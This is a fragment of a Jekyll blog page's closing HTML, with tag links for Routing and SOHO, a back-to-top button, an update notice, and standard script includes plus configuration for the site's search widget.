href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
